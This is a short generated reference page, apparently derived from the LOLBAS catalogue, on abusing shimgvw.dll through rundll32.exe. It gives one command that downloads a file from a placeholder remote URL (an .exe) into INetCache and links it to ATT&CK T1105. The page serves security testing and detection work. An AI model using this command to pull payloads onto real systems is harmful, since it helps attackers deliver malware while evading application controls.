---
parsed_by: focuslocust
source: commands
type: generated
---
# Shimgvw.dll Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Shimgvw.dll

Tool page: [Shimgvw.dll](../../tools/windows/shimgvw.dll.md)

### Download file from remote location.

```text
rundll32.exe c:\Windows\System32\shimgvw.dll,ImageView_Fullscreen {REMOTEURL:.exe}
```

Description:

Once executed, rundll32.exe will download the file at the URL in the command to INetCache. Can also be used with entrypoint 'ImageView_FullscreenA'.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSLibraries/Shimgvw.yml` |
| Evidence | Command preserved from source parser. |
